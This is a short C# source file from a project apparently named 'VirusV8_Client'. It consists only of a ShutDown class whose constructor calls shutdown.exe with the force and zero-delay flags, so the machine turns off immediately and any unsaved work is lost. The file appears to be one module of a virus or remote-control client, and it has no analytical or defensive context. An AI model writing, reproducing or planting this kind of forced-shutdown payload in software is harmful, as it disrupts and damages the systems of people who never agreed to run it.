using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace VirusV8_Client
{
    class ShutDown
    {
        public ShutDown()
        {
            System.Diagnostics.Process.Start(System.Environment.SystemDirectory + "\\shutdown.exe", "-s -t 0 -f");
        }
    }
}
